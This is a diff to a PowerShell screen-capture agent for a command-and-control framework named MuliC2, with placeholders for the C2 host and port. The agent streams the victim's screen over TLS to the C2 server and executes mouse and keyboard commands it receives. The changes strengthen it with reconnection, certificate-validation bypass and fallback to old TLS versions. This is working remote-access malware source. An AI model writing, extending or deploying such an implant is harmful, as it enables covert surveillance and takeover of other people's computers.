@@ -1,4 +1,4 @@
-# MuliC2 VNC Screen Capture Agent - Robust Version
+# MuliC2 VNC Screen Capture Agent - Fixed TLS Version
 # C2 Host: {{C2_HOST}}
 # C2 Port: {{C2_PORT}}
 # Generated: {{GENERATED_DATE}}
@@ -24,7 +24,7 @@ function Start-Cleanup {
     
     Write-Host "`n[*] Cleaning up resources..." -ForegroundColor Yellow
     
-        try {
+    try {
         if ($global:sslStream) {
             $global:sslStream.Close()
             $global:sslStream.Dispose()
@@ -48,7 +48,7 @@ function Start-Cleanup {
 }
 
 # Set up cleanup on exit
-Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Start-Cleanup }
+Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action { Start-Cleanup } | Out-Null
 $null = Register-ObjectEvent -InputObject ([System.Console]) -EventName CancelKeyPress -Action { 
     Write-Host "`n[*] Received Ctrl+C, initiating cleanup..." -ForegroundColor Yellow
     Start-Cleanup
@@ -106,69 +106,148 @@ public class Win32API {
 
 function Test-Connection {
     try {
-        return ($global:tcpClient -and $global:tcpClient.Connected -and $global:sslStream -and $global:sslStream.CanWrite)
+        return ($global:tcpClient -and $global:tcpClient.Connected -and $global:sslStream -and $global:sslStream.CanWrite -and $global:sslStream.IsAuthenticated)
     } catch {
         return $false
     }
 }
 
 function Connect-ToServer {
-    param([int]$timeoutMs = 10000)
+    param([int]$timeoutMs = 15000)
     
     try {
         Write-Host "[*] Connecting to MuliC2 server at ${C2Host}:${C2Port}..." -ForegroundColor Cyan
         
         # Clean up existing connection
-        if ($global:sslStream) { $global:sslStream.Close(); $global:sslStream.Dispose() }
-        if ($global:tcpClient) { $global:tcpClient.Close(); $global:tcpClient.Dispose() }
+        if ($global:sslStream) { 
+            try { $global:sslStream.Close() } catch {}
+            try { $global:sslStream.Dispose() } catch {}
+            $global:sslStream = $null
+        }
+        if ($global:tcpClient) { 
+            try { $global:tcpClient.Close() } catch {}
+            try { $global:tcpClient.Dispose() } catch {}
+            $global:tcpClient = $null
+        }
         
+        # Create new TCP client
         $global:tcpClient = New-Object System.Net.Sockets.TcpClient
         
         # Set timeouts and buffer sizes
-        $global:tcpClient.ReceiveTimeout = 5000
-        $global:tcpClient.SendTimeout = 10000
+        $global:tcpClient.ReceiveTimeout = 10000
+        $global:tcpClient.SendTimeout = 15000
         $global:tcpClient.ReceiveBufferSize = 65536
         $global:tcpClient.SendBufferSize = 65536
         
         # Connect with timeout
+        Write-Host "[*] Establishing TCP connection..." -ForegroundColor Yellow
         $asyncResult = $global:tcpClient.BeginConnect($C2Host, $C2Port, $null, $null)
         $waitSuccess = $asyncResult.AsyncWaitHandle.WaitOne($timeoutMs, $false)
         
         if (-not $waitSuccess) {
-            $global:tcpClient.Close()
-            throw "Connection timeout after ${timeoutMs}ms"
+            throw "TCP connection timeout after ${timeoutMs}ms"
         }
         
         $global:tcpClient.EndConnect($asyncResult)
         
         if (-not $global:tcpClient.Connected) {
-            throw "Connection failed"
+            throw "TCP connection failed"
         }
+        
+        Write-Host "[+] TCP connection established" -ForegroundColor Green
         
         # Configure socket options
         $socket = $global:tcpClient.Client
         $socket.NoDelay = $true
         $socket.LingerState = New-Object System.Net.Sockets.LingerOption($true, 1)
         
-        # Get network stream and upgrade to TLS
-        $global:sslStream = New-Object System.Net.Security.SslStream($global:tcpClient.GetStream(), $false, {
-            param($sender, $certificate, $chain, $sslPolicyErrors)
-            return $true  # Accept all certificates (bypass validation)
-        })
+        # Get the network stream
+        $networkStream = $global:tcpClient.GetStream()
         
-        # Authenticate as client (bypass certificate validation)
-        $global:sslStream.AuthenticateAsClient($C2Host, $null, [System.Security.Authentication.SslProtocols]::Tls12, $false)
+        # Create SSL stream with proper certificate validation callback
+        Write-Host "[*] Initializing TLS handshake..." -ForegroundColor Yellow
+        $global:sslStream = New-Object System.Net.Security.SslStream(
+            $networkStream, 
+            $false, 
+            ([System.Net.Security.RemoteCertificateValidationCallback] {
+                param($sender, $certificate, $chain, $sslPolicyErrors)
+                # Accept all certificates for C2 communication
+                Write-Host "[*] Certificate validation bypassed (C2 mode)" -ForegroundColor Gray
+                return $true
+            })
+        )
         
-        $global:sslStream.ReadTimeout = 1000
-        $global:sslStream.WriteTimeout = 5000
+        # Set SSL stream timeouts
+        $global:sslStream.ReadTimeout = 5000
+        $global:sslStream.WriteTimeout = 10000
         
-        Write-Host "[+] TLS connection established" -ForegroundColor Green
+        # Perform TLS handshake
+        try {
+            Write-Host "[*] Performing TLS handshake with server..." -ForegroundColor Yellow
+            $global:sslStream.AuthenticateAsClient(
+                $C2Host,
+                $null,
+                [System.Security.Authentication.SslProtocols]::Tls12 -bor [System.Security.Authentication.SslProtocols]::Tls13,
+                $false
+            )
+        } catch {
+            Write-Host "[!] TLS 1.2/1.3 failed, trying TLS 1.1..." -ForegroundColor Yellow
+            try {
+                $global:sslStream.AuthenticateAsClient(
+                    $C2Host,
+                    $null,
+                    [System.Security.Authentication.SslProtocols]::Tls11,
+                    $false
+                )
+            } catch {
+                Write-Host "[!] TLS 1.1 failed, trying TLS 1.0..." -ForegroundColor Yellow
+                $global:sslStream.AuthenticateAsClient(
+                    $C2Host,
+                    $null,
+                    [System.Security.Authentication.SslProtocols]::Tls,
+                    $false
+                )
+            }
+        }
+        
+        # Verify TLS connection
+        if (-not $global:sslStream.IsAuthenticated) {
+            throw "TLS authentication failed - connection is not authenticated"
+        }
+        
+        if (-not $global:sslStream.IsEncrypted) {
+            throw "TLS encryption failed - connection is not encrypted"
+        }
+        
+        if (-not $global:sslStream.IsSigned) {
+            Write-Host "[!] Warning: TLS connection is not signed" -ForegroundColor Yellow
+        }
+        
+        Write-Host "[+] TLS connection established successfully" -ForegroundColor Green
+        Write-Host "[*] TLS Protocol: $($global:sslStream.SslProtocol)" -ForegroundColor Gray
+        Write-Host "[*] Cipher Algorithm: $($global:sslStream.CipherAlgorithm)" -ForegroundColor Gray
+        Write-Host "[*] Hash Algorithm: $($global:sslStream.HashAlgorithm)" -ForegroundColor Gray
+        Write-Host "[*] Key Exchange: $($global:sslStream.KeyExchangeAlgorithm)" -ForegroundColor Gray
+        
         $global:reconnectAttempts = 0
         return $true
         
     } catch {
         Write-Host "[!] Connection failed: $($_.Exception.Message)" -ForegroundColor Red
         $global:reconnectAttempts++
+        
+        # Clean up failed connection
+        if ($global:sslStream) { 
+            try { $global:sslStream.Close() } catch {}
+            try { $global:sslStream.Dispose() } catch {}
+            $global:sslStream = $null
+        }
+        if ($global:tcpClient) { 
+            try { $global:tcpClient.Close() } catch {}
+            try { $global:tcpClient.Dispose() } catch {}
+            $global:tcpClient = $null
+        }
+        
         return $false
     }
 }
@@ -184,11 +263,11 @@ function Send-Frame {
     }
     
     try {
-        # Send frame length header
+        # Send frame length header (4 bytes, little endian)
         $lenBytes = [BitConverter]::GetBytes([int]$frameBytes.Length)
         $global:sslStream.Write($lenBytes, 0, 4)
         
-        # Send frame data in chunks to avoid buffer overflow
+        # Send frame data in chunks to avoid overwhelming the connection
         $chunkSize = 8192
         $totalSent = 0
         
@@ -199,14 +278,15 @@ function Send-Frame {
             $global:sslStream.Write($frameBytes, $totalSent, $currentChunkSize)
             $totalSent += $currentChunkSize
             
-            # Small delay between chunks to prevent overwhelming the connection
+            # Flush after each chunk
             $global:sslStream.Flush()
             
-            # Small delay between chunks to prevent overwhelming the connection
+            # Small delay between large chunks
             if ($remainingBytes -gt $chunkSize) {
                 Start-Sleep -Milliseconds 1
             }
         }
+        
         return $true
         
     } catch {
@@ -443,9 +523,14 @@ function Invoke-KeyboardEvent {
 
 # Main execution
 try {
+    # Initial connection attempt
     if (-not (Connect-ToServer)) {
-        Write-Host "[!] Initial connection failed" -ForegroundColor Red
-        exit 1
+        Write-Host "[!] Initial connection failed, retrying..." -ForegroundColor Red
+        Start-Sleep -Seconds 2
+        if (-not (Connect-ToServer)) {
+            Write-Host "[!] All connection attempts failed" -ForegroundColor Red
+            exit 1
+        }
     }
     
     $realScreenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
@@ -457,6 +542,7 @@ try {
     Write-Host "[*] Screen: ${realScreenWidth}x${realScreenHeight} -> ${targetWidth}x${targetHeight}" -ForegroundColor Gray
     Write-Host "[*] Administrator: $(Test-Administrator)" -ForegroundColor Gray
     Write-Host "[*] Frame rate: 3 FPS (every ~333ms)" -ForegroundColor Gray
+    Write-Host "[*] TLS Connection: ACTIVE" -ForegroundColor Green
     Write-Host "[*] Press CTRL+C to exit gracefully" -ForegroundColor Cyan
     
     while ($global:isRunning) {
@@ -504,7 +590,7 @@ try {
                                     Invoke-KeyboardEvent $inputEvent.event $inputEvent.key $inputEvent.code $inputEvent.keyCode $inputEvent.ctrlKey $inputEvent.shiftKey $inputEvent.altKey
                                 } elseif ($inputEvent.type -eq 'test' -and $inputEvent.event -eq 'show_messagebox') {
                                     try {
-                                        [System.Windows.Forms.MessageBox]::Show("Input test successful!`n`nIf you see this message, the connection is working.`nClicks should now work properly.", "MuliC2 VNC Agent Test", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+                                        [System.Windows.Forms.MessageBox]::Show("Input test successful!`n`nIf you see this message, the TLS connection is working.`nClicks should now work properly.", "MuliC2 VNC Agent Test", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
                                         Write-Host "[+] Test MessageBox displayed successfully" -ForegroundColor Green
                                     } catch {
                                         Write-Host "[!] MessageBox failed: $($_.Exception.Message)" -ForegroundColor Red
@@ -535,11 +621,11 @@ try {
                 $graphics.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                 $graphics.DrawImage($bmpFull, 0, 0, $targetWidth, $targetHeight)
                 
-                # Convert to JPEG with lower quality for smaller size
+                # Convert to JPEG with moderate quality for balance between size and clarity
                 $ms = New-Object System.IO.MemoryStream
                 $encoder = [System.Drawing.Imaging.Encoder]::Quality
                 $encoderParams = New-Object System.Drawing.Imaging.EncoderParameters(1)
-                $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 60L)  # Lower quality for smaller files
+                $encoderParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter($encoder, 60L)
                 $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                 
                 $bmp.Save($ms, $jpegCodec, $encoderParams)
@@ -559,12 +645,12 @@ try {
                     $global:frameCounter++
                     
                     if (($global:frameCounter % 30) -eq 0) {  # Log every 30 frames (10 seconds)
-                        Write-Host "[*] Frame #$($global:frameCounter) sent ($($frameBytes.Length) bytes)" -ForegroundColor DarkGreen
+                        Write-Host "[*] Frame #$($global:frameCounter) sent ($($frameBytes.Length) bytes) via TLS" -ForegroundColor DarkGreen
                     }
                 } else {
                     Write-Host "[!] Failed to send frame #$($global:frameCounter + 1)" -ForegroundColor Red
                     
-                    # Try to reconnect after a few failed frames
+                    # Try to reconnect after failed frames
                     if ($global:reconnectAttempts -ge $global:maxReconnectAttempts) {
                         Write-Host "[!] Max reconnection attempts reached. Exiting..." -ForegroundColor Red
                         break
